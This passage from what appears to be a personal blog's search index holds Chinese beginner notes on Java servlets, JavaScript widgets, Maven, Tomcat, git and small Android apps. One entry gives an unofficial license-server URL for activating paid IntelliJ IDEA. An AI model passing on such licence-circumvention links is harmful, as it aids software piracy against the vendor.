*/ //t1(request); /** * 3.2请求头 * */ //t2(request); /** * 3.3请求的实体内容 * 在doPost中实现 * */ } private void t3(HttpServletRequest request) throws IOException { InputStream in = request.getInputStream(); byte[] buf = new byte[1024]; int len = 0; while((len = in.read(buf))!= -1){ String str = new String(buf,0,len); System.out.println(str); } } private void t2(HttpServletRequest request) { String host = request.getHeader(&quot;Host&quot;); System.out.println(host); //变量 Enumeration&lt;String&gt; enums = request.getHeaderNames(); while(enums.hasMoreElements()){ String headerName = enums.nextElement(); String headerValue = request.getHeader(headerName); System.out.println(headerName + &quot; : &quot;+headerValue); } } private void t1(HttpServletRequest request) { System.out.println(&quot;请求方式: &quot;+request.getMethod()); System.out.println(&quot;URI: &quot;+request.getRequestURI()); System.out.println(&quot;URL: &quot;+request.getRequestURL()); System.out.println(&quot;http协议版本：&quot;+request.getProtocol()); } }","categories":[],"tags":[{"name":"http协议","slug":"http协议","permalink":"http://yoursite.com/tags/http%E5%8D%8F%E8%AE%AE/"}]},{"title":"配置第一个servlet","slug":"配置第一个servlet","date":"2017-11-20T09:25:27.000Z","updated":"2020-11-14T17:11:36.784Z","comments":true,"path":"2017/11/20/配置第一个servlet/","link":"","permalink":"http://yoursite.com/2017/11/20/%E9%85%8D%E7%BD%AE%E7%AC%AC%E4%B8%80%E4%B8%AAservlet/","excerpt":"","text":"//首先写一个HelloServlet.java,通过编译后，得到一个HelloServlet.class //下面是HelloServlet.java源代码 package com.husky.sever; import javax.servlet.ServletException; import javax.servlet.http.HttpServlet; import javax.servlet.http.HttpServletRequest; import javax.servlet.http.HttpServletResponse; import java.io.IOException; import java.util.Date; public class HelloServlet extends HttpServlet { @Override protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException { //解决中文乱码 response.setContentType(&quot;text/html;charset=utf-8&quot;); //向浏览器输出内容 response.getWriter().write(&quot;这是一个servlet程序，当前时间为：&quot;+ new Date()); } } //配置tomcat服务器里面的文件 //在tomcat里面的webapps里面 /** ---------webapps -----------|myweb ---------------|WEB-INF ------------------|classes将刚刚编译过的helloservlet的class文件放进class，记得将包也带上 ------------------|lib ------------------|src ------------------|web.xml */ //下面是web.xml &lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; &lt;web-app xmlns=&quot;http://xmlns.jcp.org/xml/ns/javaee&quot; xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; xsi:schemaLocation=&quot;http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_3_1.xsd&quot; version=&quot;3.1&quot;&gt; &lt;!--配置一个servlet程序--&gt; &lt;servlet&gt; &lt;!--servlet的内部名称，可以自定义--&gt; &lt;servlet-name&gt;HelloServlet&lt;/servlet-name&gt; &lt;!--servlet类名：包名+简单类名--&gt; &lt;servlet-class&gt;com.husky.sever.HelloServlet&lt;/servlet-class&gt; &lt;/servlet&gt; &lt;servlet-mapping&gt; &lt;!--servlet的内部名称，和上面的名称保持一致--&gt; &lt;servlet-name&gt;HelloServlet&lt;/servlet-name&gt; &lt;!--servlet的访问名称： /名称--&gt; &lt;url-pattern&gt;/hello&lt;/url-pattern&gt; &lt;/servlet-mapping&gt; &lt;/web-app&gt; //将tomcat的startup.bat点击后，浏览器输入http://localhost:端口号/myweb/hello","categories":[],"tags":[]},{"title":"配置文件路径如何写","slug":"配置文件路径如何写","date":"2017-11-14T12:30:37.000Z","updated":"2020-11-14T17:11:37.264Z","comments":true,"path":"2017/11/14/配置文件路径如何写/","link":"","permalink":"http://yoursite.com/2017/11/14/%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E8%B7%AF%E5%BE%84%E5%A6%82%E4%BD%95%E5%86%99/","excerpt":"","text":"Demo1.java package com.husky.path; import java.io.FileReader; import java.io.InputStream; import java.util.Properties; /** * 配置文件的路径应该如何去写？ * 绝对路径：一个文件的完整路径信息。一般绝对路径带盘符，无法使用 * 相对路径：相对于当前程序的路径。当前路径就是执行java命令的时候，控制台的位置 * 类文件路径：类文件路径就是使用了classpath的路径找到相应的资源 * 如果需要使用类文件路径首先要获取一个Class对象 * * * */ public class Demo1 { static Properties properties; static{ try{ properties = new Properties(); Class clazz = Demo1.class; InputStream inputStream = clazz.getResourceAsStream(&quot;/db.properties&quot;); properties.load(inputStream); }catch (Exception e){ e.printStackTrace(); } } public static void main(String[] args){ System.out.println(&quot;username:&quot;+properties.getProperty(&quot;user&quot;)+&quot;密码:&quot;+properties.getProperty(&quot;password&quot;)); } }db.properties user=husky password=dabendan","categories":[],"tags":[]},{"title":"js简单字母验证码","slug":"js简单字母验证码","date":"2017-11-14T12:17:50.000Z","updated":"2020-11-14T17:11:37.968Z","comments":true,"path":"2017/11/14/js简单字母验证码/","link":"","permalink":"http://yoursite.com/2017/11/14/js%E7%AE%80%E5%8D%95%E5%AD%97%E6%AF%8D%E9%AA%8C%E8%AF%81%E7%A0%81/","excerpt":"","text":"&lt;!DOCTYPE html&gt; &lt;html lang=&quot;en&quot;&gt; &lt;head&gt; &lt;script type=&quot;text/javascript&quot;&gt; function createCode() { var datas = [&apos;A&apos;,&apos;B&apos;,&apos;C&apos;,&apos;D&apos;,&apos;E&apos;,&apos;F&apos;]; var code = &quot;&quot;; for(var i = 0;i &lt; 4;i++){ var index = Math.floor(Math.random()*datas.length); code += datas[index]; } var spanNode = document.getElementById(&quot;code&quot;); spanNode.innerHTML = code; } function ready() { createCode(); } &lt;/script&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;title&gt;产生验证码&lt;/title&gt; &lt;/head&gt; &lt;body onload=&quot;ready()&quot;&gt; &lt;span id=&quot;code&quot;&gt;&lt;/span&gt;&lt;a href=&quot;#&quot; onclick=&quot;createCode()&quot;&gt;看不清，换一个&lt;/a&gt; &lt;/body&gt; &lt;/html&gt;重点：1.onload，在js里面写一个function ready（），然后调用防止找不到，因为刚开始运行时，无法找到id code2 .&lt;span id=&quot;code&quot;&gt;&lt;/span&gt;&lt;a href=&quot;#&quot; onclick=&quot;createCode()&quot;&gt;看不清，换一个&lt;/a&gt;这句就是span里面不放东西，可以后来再放进去","categories":[],"tags":[]},{"title":"城市的联动框","slug":"城市的联动框","date":"2017-11-14T12:12:58.000Z","updated":"2020-11-14T17:11:38.516Z","comments":true,"path":"2017/11/14/城市的联动框/","link":"","permalink":"http://yoursite.com/2017/11/14/%E5%9F%8E%E5%B8%82%E7%9A%84%E8%81%94%E5%8A%A8%E6%A1%86/","excerpt":"","text":"&lt;!DOCTYPE html&gt; &lt;html lang=&quot;en&quot;&gt; &lt;head&gt; &lt;script type=&quot;text/javascript&quot;&gt; function showCity() { var citys = [[],[&quot;guangzhou&quot;,&quot;fousan&quot;,&quot;zhongsan&quot;],[&quot;changsha&quot;,&quot;hengyang&quot;,&quot;yueyang&quot;]]; var provinceNode = document.getElementById(&quot;province&quot;); var selectIndex = provinceNode.selectedIndex; var cityDatas = citys[selectIndex]; var cityNode = document.getElementById(&quot;city&quot;); // //先清空city框所有option // var children = cityNode.childNodes; // for(var i = 0; i&lt;children.length ; ){ // cityNode.removeChild(children[i]); // } cityNode.options.length = 1; for(var index = 0;index&lt;cityDatas.length;index++){ var option = document.createElement(&quot;option&quot;); option.innerHTML = cityDatas[index]; cityNode.appendChild(option); } } &lt;/script&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;title&gt;Title&lt;/title&gt; &lt;/head&gt; &lt;body&gt; 省份&lt;select id=&quot;province&quot; onchange=&quot;showCity()&quot;&gt; &lt;option&gt;省份&lt;/option&gt; &lt;option&gt;广东&lt;/option&gt; &lt;option&gt;湖南&lt;/option&gt; &lt;/select&gt; 城市&lt;select id=&quot;city&quot;&gt;&lt;option&gt;城市&lt;/option&gt;&lt;/select&gt; &lt;/body&gt; &lt;/html&gt;实现的联动框，主要就是当第一个下拉框onchange时，获取其中的selectIndex，再通过这个索引值获取选中的元素，根据元素来实现下一个下拉框的option","categories":[],"tags":[]},{"title":"用idea创建maven简单的java项目","slug":"用idea创建maven简单的java项目","date":"2017-11-03T02:39:54.000Z","updated":"2020-11-14T17:11:40.689Z","comments":true,"path":"2017/11/03/用idea创建maven简单的java项目/","link":"","permalink":"http://yoursite.com/2017/11/03/%E7%94%A8idea%E5%88%9B%E5%BB%BAmaven%E7%AE%80%E5%8D%95%E7%9A%84java%E9%A1%B9%E7%9B%AE/","excerpt":"","text":"首先，maven特别像android里面build.gradle里面dependencies，个人感觉很棒。很方便首先，eclipse创建maven很简单，你在创建的时候，下面会有maven project. 进入主题，在idea里面创建maven project1.不选任何东西2. 随意填，我也不是太懂这个格式，但是并不影响3. 然后finish4. 目录像上图这样5. 修改pom.xml,并在你们修改，导入org.json修改的时候，会提示auto-import，你选择一下这个6. 创建一个java程序，测试一下，通过import org.json.JSONObject，看是否导入成功","categories":[],"tags":[{"name":"java","slug":"java","permalink":"http://yoursite.com/tags/java/"},{"name":"maven","slug":"maven","permalink":"http://yoursite.com/tags/maven/"},{"name":"idea","slug":"idea","permalink":"http://yoursite.com/tags/idea/"}]},{"title":"idea 配置 tomcat","slug":"idea 配置 tomcat","date":"2017-10-31T08:58:19.000Z","updated":"2020-11-14T17:11:41.393Z","comments":true,"path":"2017/10/31/idea 配置 tomcat/","link":"","permalink":"http://yoursite.com/2017/10/31/idea%20%E9%85%8D%E7%BD%AE%20tomcat/","excerpt":"","text":"出现unable to open the service tomcat怎么办 具体配置 IntelliJ IDEA 2016.2 配置Tomcat 运行Web项目 上面这个配置必须是收费版的，因为社区版不支持tomcat这些，具体你可以在idea官网上面看到。收费版的注册码，license server，， http://idea.iteblog.com/key.php 配置当中唯一有个小缺点就是在 ![这里写图片描述](http://qjrzrivoh.hd-bkt.clouddn.com/1605373901.17446359955.png)application server选择configure，tomcat的安装路径，然后ok Intellij IDEA 2017创建第一个Struts2程序","categories":[],"tags":[]},{"title":"git上传项目","slug":"git上传项目","date":"2017-10-11T08:41:08.000Z","updated":"2020-11-14T17:11:41.997Z","comments":true,"path":"2017/10/11/git上传项目/","link":"","permalink":"http://yoursite.com/2017/10/11/git%E4%B8%8A%E4%BC%A0%E9%A1%B9%E7%9B%AE/","excerpt":"","text":"打开github create a new Repositry，填写Repository name，然后create repository 打开你要提交的项目的目录，打开终端 git init初始化空的git仓库 git add . git commit -m”RecyclerView”在引号里面是注释部分 git remote add origin git@github.com:pompeii666/UIPractice.git（介绍一下，git remote add + origin+仓库地址）仓库地址是你在创建后会有的，origin是标识符 git push -u origin master当前分支的内容就会被推送到远程仓库origin的master分支 具体还可以看 http://www.ruanyifeng.com/blog/2014/06/git_remote.html http://www.cnblogs.com/specter45/p/github.html 更新项目 打开之前的工程的项目的目录git status git add .(更新各个修改过的文件) git status（会发现已经成功了） git commit -a git push 具体的还可以看 更新项目 Everything up-to-date","categories":[],"tags":[{"name":"github","slug":"github","permalink":"http://yoursite.com/tags/github/"}]},{"title":"ubuntu创建热点","slug":"ubuntu创建热点","date":"2017-09-15T01:25:53.000Z","updated":"2020-11-14T17:11:42.476Z","comments":true,"path":"2017/09/15/ubuntu创建热点/","link":"","permalink":"http://yoursite.com/2017/09/15/ubuntu%E5%88%9B%E5%BB%BA%E7%83%AD%E7%82%B9/","excerpt":"","text":"http://www.cnblogs.com/king-ding/archive/2016/10/09/ubuntuWIFI.html","categories":[],"tags":[]},{"title":"Toast弹出信息","slug":"Toast弹出信息","date":"2017-09-12T13:01:26.000Z","updated":"2020-11-14T17:11:42.951Z","comments":true,"path":"2017/09/12/Toast弹出信息/","link":"","permalink":"http://yoursite.com/2017/09/12/Toast%E5%BC%B9%E5%87%BA%E4%BF%A1%E6%81%AF/","excerpt":"","text":"做了一个判断数量的框，范围是0-100，但是一旦小于0，或者大于100，就要提示用户，不能越界。这个时候，根据视频中提示，知道了Toast，google了一会，看不懂，然后看了中文的一般有5种（别的人博客介绍的）就讲第一种吧， Toast.makeText(MainActivity.this, &quot;Hello&quot;, Toast.LENGTH_SHORT).show();会在底部弹出，hello，但是如果是通过按钮来触发这个，而且按钮按了很多次，会导致，Toast一直存在在这儿，很影响用户体验。所以，又看到一篇 private static Toast myToast; public static void showToast(Context context, String str) { if(myToast == null) { myToast = Toast.makeText(context, str, Toast.LENGTH_SHORT); } else { myToast.setText(str); } myToast.show(); }在new一个Toast之前先判断这个myToast是不是为NULL,如果不是NULL，就不要再去new了，以免队列中存放过多的Toast。如果不为NULL，只是改变了myToast的显示文字，并调用show()方法。这样就避免队列中产生大量Toast了。具体信息，来自 http://blog.csdn.net/u012575819/article/details/51194160","categories":[],"tags":[{"name":"android学习笔记","slug":"android学习笔记","permalink":"http://yoursite.com/tags/android%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"}]},{"title":"ScrollView","slug":"ScrollView","date":"2017-09-11T12:40:54.000Z","updated":"2020-11-14T17:11:43.677Z","comments":true,"path":"2017/09/11/ScrollView/","link":"","permalink":"http://yoursite.com/2017/09/11/ScrollView/","excerpt":"","text":"activity_main.xml &lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; &lt;ScrollView xmlns:android=&quot;http://schemas.android.com/apk/res/android&quot; xmlns:tools=&quot;http://schemas.android.com/tools&quot; android:id=&quot;@+id/activity_main&quot; android:layout_width=&quot;match_parent&quot; android:layout_height=&quot;match_parent&quot; android:padding=&quot;10dp&quot; tools:context=&quot;com.example.android.scrollviewdemo.MainActivity&quot;&gt; &lt;LinearLayout android:layout_width=&quot;match_parent&quot; android:layout_height=&quot;match_parent&quot; android:orientation=&quot;vertical&quot;&gt; &lt;ImageView android:id=&quot;@+id/imageView&quot; android:layout_width=&quot;wrap_content&quot; android:layout_height=&quot;200dp&quot; android:scaleType=&quot;centerCrop&quot; android:src=&quot;@drawable/kebe&quot;/&gt; &lt;Button android:id=&quot;@+id/button&quot; android:layout_width=&quot;match_parent&quot; android:layout_height=&quot;wrap_content&quot; android:text=&quot;Know more&quot;/&gt; &lt;TextView android:id=&quot;@+id/titleTextView&quot; android:layout_width=&quot;wrap_content&quot; android:layout_height=&quot;wrap_content&quot; android:text=&quot;@string/title&quot; android:textAppearance=&quot;?android:attr/textAppearanceLarge&quot;/&gt; &lt;TextView android:id=&quot;@+id/contentTextView&quot; android:layout_width=&quot;wrap_content&quot; android:layout_height=&quot;wrap_content&quot; android:text=&quot;@string/content&quot; android:textAppearance=&quot;?android:attr/textAppearanceSmall&quot;/&gt; &lt;/LinearLayout&gt; &lt;/ScrollView&gt;![ScrollViewExampleImage](http://qjrzrivoh.hd-bkt.clouddn.com/1605373903.40850882446.png) http://stacktips.com/tutorials/android/android-scrollview-example 具体看这儿","categories":[],"tags":[{"name":"android学习笔记","slug":"android学习笔记","permalink":"http://yoursite.com/tags/android%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"}]},{"title":"Log_向 Android 日志中写消息","slug":"Log_向 Android 日志中写消息","date":"2017-09-11T09:39:02.000Z","updated":"2020-11-14T17:11:44.188Z","comments":true,"path":"2017/09/11/Log_向 Android 日志中写消息/","link":"","permalink":"http://yoursite.com/2017/09/11/Log_%E5%90%91%20Android%20%E6%97%A5%E5%BF%97%E4%B8%AD%E5%86%99%E6%B6%88%E6%81%AF/","excerpt":"","text":"activity_main.xml &lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; &lt;LinearLayout xmlns:android=&quot;http://schemas.android.com/apk/res/android&quot; xmlns:tools=&quot;http://schemas.android.com/tools&quot; android:layout_width=&quot;match_parent&quot; android:layout_height=&quot;match_parent&quot; android:orientation=&quot;vertical&quot; android:paddingBottom=&quot;@dimen/activity_vertical_margin&quot; android:paddingLeft=&quot;@dimen/activity_horizontal_margin&quot; android:paddingRight=&quot;@dimen/activity_horizontal_margin&quot; android:paddingTop=&quot;@dimen/activity_vertical_margin&quot; tools:context=&quot;.MainActivity&quot;&gt; &lt;TextView android:id=&quot;@+id/menu_item_1&quot; android:layout_width=&quot;wrap_content&quot; android:layout_height=&quot;wrap_content&quot; android:text=&quot;Mango sorbet&quot; android:textAppearance=&quot;?android:textAppearanceMedium&quot; /&gt; &lt;TextView android:id=&quot;@+id/menu_item_2&quot; android:layout_width=&quot;wrap_content&quot; android:layout_height=&quot;wrap_content&quot; android:layout_marginTop=&quot;8dp&quot; android:text=&quot;Blueberry pie&quot; android:textAppearance=&quot;?android:textAppearanceMedium&quot; android:textSize=&quot;18sp&quot; /&gt; &lt;TextView android:id=&quot;@+id/menu_item_3&quot; android:layout_width=&quot;wrap_content&quot; android:layout_height=&quot;wrap_content&quot; android:layout_marginTop=&quot;8dp&quot; android:text=&quot;Chocolate lava cake&quot; android:textAppearance=&quot;?android:textAppearanceMedium&quot; android:textSize=&quot;18sp&quot; /&gt; &lt;Button android:layout_width=&quot;wrap_content&quot; android:layout_height=&quot;wrap_content&quot; android:layout_marginTop=&quot;8dp&quot; android:onClick=&quot;printToLogs&quot; android:text=&quot;Print menu to logs&quot; /&gt; &lt;/LinearLayout&gt;MainActivity.java package com.example.android.menu; import android.os.Bundle; import android.support.v7.app.AppCompatActivity; import android.util.Log; import android.view.View; import android.widget.TextView; public class MainActivity extends AppCompatActivity { @Override protected void onCreate(Bundle savedInstanceState) { super.onCreate(savedInstanceState); setContentView(R.layout.activity_main); } public void printToLogs(View view){ // Find first menu item TextView and print the text to the logs TextView temp = (TextView) findViewById(R.id.menu_item_1); String tempString = temp.getText().toString(); Log.i(&quot;MainActivity&quot;,tempString); // Find second menu item TextView and print the text to the logs temp = (TextView) findViewById(R.id.menu_item_2); tempString = temp.getText().toString(); Log.i(&quot;MainActivity&quot;,tempString); // Find third menu item TextView and print the text to the logs temp = (TextView) findViewById(R.id.menu_item_3); tempString = temp.getText().toString(); Log.i(&quot;MainActivity&quot;,tempString); } }重点内容 这里，我们使用了 Log.i()，表示“信息”级别的日志。其他级别的选项如下所示： e(String, String)（错误）w(String, String)（警告）i(String, String)（信息）d(String, String)（调试）v(String, String) (详情)2.具体应该是在按按钮时使用的，正好调用这个方法。3.查看方式：android studio里面，最下面有一个androidmonitor，里面的logcat，如果是Log.i则选择info，然后可以输入tag还是下拉tag，可以找到具体信息","categories":[],"tags":[{"name":"android学习笔记","slug":"android学习笔记","permalink":"http://yoursite.com/tags/android%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"}]},{"title":"计分器","slug":"计分器","date":"2017-09-10T03:20:59.000Z","updated":"2020-11-14T17:11:44.990Z","comments":true,"path":"2017/09/10/计分器/","link":"","permalink":"http://yoursite.com/2017/09/10/%E8%AE%A1%E5%88%86%E5%99%A8/","excerpt":"","text":"activity_main.xml &lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; &lt;RelativeLayout xmlns:android=&quot;http://schemas.android.com/apk/res/android&quot; xmlns:tools=&quot;http://schemas.android.com/tools&quot; android:id=&quot;@+id/activity_main&quot; android:layout_width=&quot;match_parent&quot; android:layout_height=&quot;match_parent&quot; android:paddingBottom=&quot;@dimen/activity_vertical_margin&quot; android:paddingLeft=&quot;@dimen/activity_horizontal_margin&quot; android:paddingRight=&quot;@dimen/activity_horizontal_margin&quot; android:paddingTop=&quot;@dimen/activity_vertical_margin&quot; tools:context=&quot;com.example.android.courtcounter.MainActivity&quot;&gt; &lt;RelativeLayout android:id=&quot;@+id/team_a_view&quot; android:layout_width=&quot;170dp&quot; android:layout_height=&quot;300dp&quot; &gt; &lt;TextView android:id=&quot;@+id/team_a&quot; android:text=&quot;Team A&quot; android:layout_width=&quot;wrap_content&quot; android:layout_height=&quot;wrap_content&quot; android:layout_centerHorizontal=&quot;true&quot; android:textSize=&quot;14sp&quot; android:textColor=&quot;#616161&quot; android:fontFamily=&quot;sans-serif-medium&quot;/&gt; &lt;TextView android:id=&quot;@+id/scoreA_text_view&quot; android:text=&quot;0&quot; android:layout_width=&quot;wrap_content&quot; android:layout_height=&quot;wrap_content&quot; android:layout_below=&quot;@+id/team_a&quot; android:layout_marginTop=&quot;16dp&quot; android:layout_marginBottom=&quot;16dp&quot; android:layout_centerHorizontal=&quot;true&quot; android:textSize=&quot;56sp&quot; android:textColor=&quot;#000000&quot; android:fontFamily=&quot;sans-serif-light&quot;/&gt; &lt;Button android:id=&quot;@+id/point_3&quot; android:layout_width=&quot;match_parent&quot; android:layout_height=&quot;wrap_content&quot; android:layout_marginLeft=&quot;24dp&quot; android:layout_marginRight=&quot;24dp&quot; android:text=&quot;+3 point&quot; android:layout_below=&quot;@+id/scoreA_text_view&quot; android:onClick=&quot;addThreeTeamA&quot;/&gt; &lt;Button android:id=&quot;@+id/point_2&quot; android:layout_width=&quot;match_parent&quot; android:layout_height=&quot;wrap_content&quot; android:layout_marginLeft=&quot;24dp&quot; android:layout_marginRight=&quot;24dp&quot; android:layout_marginTop=&quot;16dp&quot; android:layout_marginBottom=&quot;16dp&quot; android:text=&quot;+2 point&quot; android:layout_below=&quot;@+id/point_3&quot; android:onClick=&quot;addTwoTeamA&quot;/&gt; &lt;Button android:id=&quot;@+id/free_point&quot; android:layout_width=&quot;match_parent&quot; android:layout_height=&quot;wrap_content&quot; android:layout_marginLeft=&quot;24dp&quot; android:layout_marginRight=&quot;24dp&quot; android:text=&quot;free point&quot; android:layout_below=&quot;@+id/point_2&quot; android:onClick=&quot;addOneTeamA&quot;/&gt; &lt;/RelativeLayout&gt; &lt;RelativeLayout android:id=&quot;@+id/line&quot; android:layout_width=&quot;1dp&quot; android:layout_height=&quot;300dp&quot; android:layout_toRightOf=&quot;@+id/team_a_view&quot; android:background=&quot;@android:color/darker_gray&quot;&gt; &lt;/RelativeLayout&gt; &lt;RelativeLayout android:id=&quot;@+id/team_b_view&quot; android:layout_width=&quot;170dp&quot; android:layout_height=&quot;300dp&quot; android:layout_toRightOf=&quot;@+id/line&quot;&gt; &lt;TextView android:id=&quot;@+id/team_b&quot; android:text=&quot;Team B&quot; android:layout_width=&quot;wrap_content&quot; android:layout_height=&quot;wrap_content&quot; android:layout_centerHorizontal=&quot;true&quot; android:textSize=&quot;14sp&quot; android:textColor=&quot;#616161&quot; android:fontFamily=&quot;sans-serif-medium&quot;/&gt; &lt;TextView android:id=&quot;@+id/scoreB_text_view&quot; android:text=&quot;0&quot; android:layout_width=&quot;wrap_content&quot; android:layout_height=&quot;wrap_content&quot; android:layout_marginTop=&quot;16dp&quot; android:layout_marginBottom=&quot;16dp&quot; android:layout_below=&quot;@+id/team_b&quot; android:layout_centerHorizontal=&quot;true&quot; android:textSize=&quot;56sp&quot; android:textColor=&quot;#000000&quot; android:fontFamily=&quot;sans-serif-light&quot;/&gt; &lt;Button android:id=&quot;@+id/pointB_3&quot; android:layout_width=&quot;match_parent&quot; android:layout_height=&quot;wrap_content&quot; android:layout_marginLeft=&quot;24dp&quot; android:layout_marginRight=&quot;24dp&quot; android:text=&quot;+3 point&quot; android:layout_below=&quot;@+id/scoreB_text_view&quot; android:onClick=&quot;addThreeTeamB&quot;/&gt; &lt;Button android:id=&quot;@+id/pointB_2&quot; android:layout_width=&quot;match_parent&quot; android:layout_height=&quot;wrap_content&quot; android:layout_marginLeft=&quot;24dp&quot; android:layout_marginRight=&quot;24dp&quot; android:layout_marginTop=&quot;16dp&quot; android:layout_marginBottom=&quot;16dp&quot; android:text=&quot;+2 point&quot; android:layout_below=&quot;@+id/pointB_3&quot; android:onClick=&quot;addTwoTeamB&quot;/&gt; &lt;Button android:id=&quot;@+id/free_pointB&quot; android:layout_width=&quot;match_parent&quot; android:layout_height=&quot;wrap_content&quot; android:layout_marginLeft=&quot;24dp&quot; android:layout_marginRight=&quot;24dp&quot; android:text=&quot;FREE POINT&quot; android:layout_below=&quot;@+id/pointB_2&quot; android:onClick=&quot;addOneTeamB&quot;/&gt; &lt;/RelativeLayout&gt; &lt;Button android:text=&quot;RESET&quot; android:layout_width=&quot;wrap_content&quot; android:layout_height=&quot;wrap_content&quot; android:layout_alignParentBottom=&quot;true&quot; android:layout_centerHorizontal=&quot;true&quot; android:onClick=&quot;reset&quot; android:layout_marginBottom=&quot;8dp&quot;/&gt; &lt;/RelativeLayout&gt;mainactivity.java package com.example.android.courtcounter; import android.os.Bundle; import android.support.v7.app.AppCompatActivity; import android.view.View; import android.widget.TextView; public class MainActivity extends AppCompatActivity { int scoreOfTeamA = 0; int scoreOfTeamB = 0; @Override protected void onCreate(Bundle savedInstanceState) { super.onCreate(savedInstanceState); setContentView(R.layout.activity_main); } public void addOneTeamA(View view){ scoreOfTeamA += 1; displayForTeamA(scoreOfTeamA); } public void addTwoTeamA(View view){ scoreOfTeamA += 2; displayForTeamA(scoreOfTeamA); } public void addThreeTeamA(View view){ scoreOfTeamA += 3; displayForTeamA(scoreOfTeamA); } public void displayForTeamA(int number){ TextView totalScoreTextView = (TextView) findViewById(R.id.scoreA_text_view); totalScoreTextView.setText(number +&quot;&quot;); } public void addOneTeamB(View view){ scoreOfTeamB += 1; displayForTeamB(scoreOfTeamB); } public void addTwoTeamB(View view){ scoreOfTeamB += 2; displayForTeamB(scoreOfTeamB); } public void addThreeTeamB(View view){ scoreOfTeamB += 3; displayForTeamB(scoreOfTeamB); } public void displayForTeamB(int number){ TextView totalScoreTextView = (TextView) findViewById(R.id.scoreB_text_view); totalScoreTextView.setText(number +&quot;&quot;); } public void reset(View v){ scoreOfTeamA = 0; scoreOfTeamB = 0; displayForTeamA(0); displayForTeamB(0); } }styles.xml &lt;resources&gt; &lt;!-- Base application theme. --&gt; &lt;style name=&quot;AppTheme&quot; parent=&quot;Theme.AppCompat.Light.DarkActionBar&quot;&gt; &lt;!-- Primary theme color of the app (sets background color of app bar) --&gt; &lt;item name=&quot;colorPrimary&quot;&gt;#FF9800&lt;/item&gt; &lt;!-- Background color of buttons in the app --&gt; &lt;item name=&quot;colorButtonNormal&quot;&gt;#FF9800&lt;/item&gt; &lt;/style&gt; &lt;/resources&gt;重点内容 就是中间的那个水平线，其实是一个view，只是width = “1dp”，height和别的一样 当然，3个view是嵌套的，是并列关系3.如果感觉自己写的没问题，可以一直报错，说找不到这个方法，可以尝试，将app删了，重新装，再测试","categories":[],"tags":[{"name":"android学习笔记","slug":"android学习笔记","permalink":"http://yoursite.com/tags/android%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"}]},{"title":"justJava小型app","slug":"justJava小型app","date":"2017-09-09T13:21:39.000Z","updated":"2020-11-14T17:11:45.738Z","comments":true,"path":"2017/09/09/justJava小型app/","link":"","permalink":"http://yoursite.com/2017/09/09/justJava%E5%B0%8F%E5%9E%8Bapp/","excerpt":"","text":"activity_main.xml &lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; &lt;LinearLayout xmlns:android=&quot;http://schemas.android.com/apk/res/android&quot; xmlns:tools=&quot;http://schemas.android.com/tools&quot; android:id=&quot;@+id/activity_main&quot; android:layout_width=&quot;match_parent&quot; android:layout_height=&quot;match_parent&quot; android:paddingBottom=&quot;@dimen/activity_vertical_margin&quot; android:paddingLeft=&quot;@dimen/activity_horizontal_margin&quot; android:paddingRight=&quot;@dimen/activity_horizontal_margin&quot; android:paddingTop=&quot;@dimen/activity_vertical_margin&quot; android:orientation=&quot;vertical&quot; tools:context=&quot;com.husky.justjava.MainActivity&quot;&gt; &lt;TextView android:id=&quot;@+id/quantity&quot; android:layout_width=&quot;wrap_content&quot; android:layout_height=&quot;wrap_content&quot; android:text=&quot;QUANTITY!&quot; android:textColor=&quot;@android:color/darker_gray&quot; android:textSize=&quot;25sp&quot; android:layout_marginBottom=&quot;16dp&quot; /&gt; &lt;RelativeLayout android:layout_width=&quot;wrap_content&quot; android:layout_height=&quot;wrap_content&quot;&gt; &lt;Button android:id=&quot;@+id/decrease&quot; android:text=&quot;+&quot; android:layout_width=&quot;48dp&quot; android:layout_height=&quot;48dp&quot; android:layout_alignParentLeft=&quot;true&quot; android:onClick=&quot;increment&quot;/&gt; &lt;TextView android:id=&quot;@+id/quantity_text_view&quot; android:text=&quot;0&quot; android:padding=&quot;10dp&quot; android:layout_width=&quot;wrap_content&quot; android:layout_height=&quot;wrap_content&quot; android:layout_toRightOf=&quot;@+id/decrease&quot; android:textSize=&quot;25sp&quot;/&gt; &lt;Button android:id=&quot;@+id/plus&quot; android:text=&quot;-&quot; android:layout_toRightOf=&quot;@+id/quantity_text_view&quot; android:layout_width=&quot;48dp&quot; android:layout_height=&quot;48dp&quot; android:onClick=&quot;decrement&quot;/&gt; &lt;/RelativeLayout&gt; &lt;TextView android:id=&quot;@+id/price&quot; android:text=&quot;PRICE&quot; android:layout_marginTop=&quot;16dp&quot; android:layout_width=&quot;wrap_content&quot; android:layout_height=&quot;wrap_content&quot; android:textSize=&quot;25sp&quot; /&gt; &lt;TextView android:id=&quot;@+id/price_text_view&quot; android:text=&quot;$0&quot; android:layout_marginTop=&quot;16dp&quot; android:layout_width=&quot;wrap_content&quot; android:layout_height=&quot;wrap_content&quot; android:textSize=&quot;25sp&quot;/&gt; &lt;Button android:id=&quot;@+id/button&quot; android:layout_width=&quot;wrap_content&quot; android:layout_height=&quot;wrap_content&quot; android:layout_marginTop=&quot;16dp&quot; android:text=&quot;ORDER&quot; android:onClick=&quot;submitOrder&quot;/&gt; &lt;/LinearLayout&gt;MainActivity.java package com.husky.justjava; import android.os.Bundle; import android.support.v7.app.AppCompatActivity; import android.view.View; import android.widget.TextView; import java.text.NumberFormat; /** * This app displays an order form to order coffee. */ public class MainActivity extends AppCompatActivity { @Override protected void onCreate(Bundle savedInstanceState) { super.onCreate(savedInstanceState); setContentView(R.layout.activity_main); } /** * This method is called when the order button is clicked. */ public void submitOrder(View view) { TextView quantityTextView = (TextView) findViewById(R.id.quantity_text_view); 